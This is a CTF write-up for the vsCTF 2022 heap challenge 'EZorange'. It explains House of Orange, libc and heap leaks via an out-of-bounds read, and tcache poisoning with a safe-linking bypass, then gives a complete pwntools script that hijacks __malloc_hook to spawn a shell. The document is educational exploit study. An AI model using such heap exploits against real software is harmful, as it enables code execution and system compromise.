---
title: "EZorange — House of Orange & Tcache Poisoning"
ctf: "vsCTF 2022"
category: "pwn"
difficulty: "medium"
points: null
date: "2026-05-12"
lat: -40.71
lng: 50.00
summary: "Utilizing House of Orange to 'free' chunks in a freeless environment, followed by Tcache Poisoning via an OOB write to hijack __malloc_hook with a One-Gadget."
tags:
  - "heap"
  - "house-of-orange"
  - "tcache-poisoning"
  - "safe-linking"
  - "glibc-2.32"
---

# House of Orange @ EZorange - vsCTF 2022 (Glibc 2.32)

## Description
**EZorange** is a heap exploitation challenge that lacks a `free()` function. It provides a `modify` function with an **Out-of-Bounds (OOB) Read/Write** vulnerability, allowing us to interact with memory at any offset from the heap chunk.

## Exploitation Flow

### 1. House of Orange (The "Freeless" Free)
Since we can't call `free`, we use the **House of Orange** technique:
- Use the OOB write to shrink the **Top Chunk** size (e.g., to `0x301`).
- Request a large allocation (`0x1000`) that exceeds this size.
- The allocator is forced to "retire" the old Top Chunk, placing it into the **Unsorted Bin** (and subsequently Tcache).

### 2. Information Leaks
- **Libc Leak:** Once the Top Chunk is in the Unsorted Bin, it contains `main_arena` pointers. We use the OOB read to leak these bytes and calculate the Libc base address.
- **Heap Leak:** We leak the `fd` pointer from a tcache chunk. This is required to bypass **Safe Linking** in Glibc 2.32.

### 3. Tcache Poisoning
We repeat the House of Orange trick to get two chunks into the `0x2e0` tcache bin.
- **Safe Linking Bypass:** We mangle our target address (`__malloc_hook`) using the leaked heap pointer:  
  `target = (Heap_Pos >> 12) ^ &__malloc_hook`
- **Overwriting FD:** We use the OOB write to inject this mangled address into the `fd` pointer of a tcache chunk.

### 4. Getting the Shell
- **Malloc 1:** Clears the first tcache entry.
- **Malloc 2:** Returns a chunk at **`__malloc_hook`**.
- **The Overwrite:** We write a **One-Gadget** address into the hook.
- **Trigger:** Call `buy()` one last time. `malloc` executes the hook and spawns the shell.


---

## 🛠 Useful Snippets

### Safe Linking Obfuscation
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./ezorange_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def modify(idx,cell,data):
    r.sendlineafter(b"> ",b"2")
    r.sendlineafter(b"number: ",idx)
    r.sendlineafter(b"index: ",cell)
    r.recvuntil(b"value: ")
    v = r.recvline()
    r.sendlineafter(b"value: ",data)
    return v

def buy(idx,size):
    r.sendlineafter(b"> ",b"1")
    r.sendlineafter(b"number: ",idx)
    r.sendlineafter(b"Size: ",size)

def main():
    global r
    r = conn()

    buy(b"0",b"10")
    modify(b"0",b"26",f"{0x00}")
    buy(b"1",f"{0x1000}")

    main_arenas = b""
    for i in range(6):
        main_arenas += p8(int(modify(b"0",f"{33+i}",b"+").strip()))

    lib = u64(b"\x00" + main_arenas.ljust(7,b"\x00")) - 0x1b8c00
    libc.address = lib

    buy(b"0",f"{0x100}")
    buy(b"1",f"{0xce0}")

    heap = b""
    for i in range(6):
        heap += p8(int(modify(b"0",f"{24+i}",b"+").strip()))

    heapbase =  u64(heap.ljust(8,b"\x00")) - 0x2b0

    log.success(f"LEAK:\nlibase:{hex(lib)}\nheapbase: {hex(heapbase)}\n")

    modify(b"1",f"{0xce8}",b"1")
    modify(b"1",f"{0xce9}",b"3")
    modify(b"1",f"{0xcea}",b"0")

    buy(b"1",f"{0x1000}")

    buy(b"0",f"{0x100}")
    buy(b"1",f"{0xce0}")

    modify(b"1",f"{0xce8}",b"1")
    modify(b"1",f"{0xce9}",b"3")
    modify(b"1",f"{0xcea}",b"0")

    buy(b"1",f"{0x1000}")



    pos  = heapbase + 0x44d10
    target = libc.sym['__malloc_hook']
    addr = target^(pos>>12)

    for i in range(6):
        modify(b"0",f"{0x44940+i}",f"{(addr>>i*8)&0xff}")

    buy(b"0",f"{0x2d0}")
    buy(b"0",f"{0x2d0}")

    one_gadget = libc.address + 0xc8c10
    for i in range(6):
        modify(b"0",f"{i}",f"{(one_gadget>>i*8)& 0xff}")

    r.interactive()
    pause()
    buy(b"0",b"0")


    r.clean()
    r.interactive()


if __name__ == "__main__":
    main()
```
---

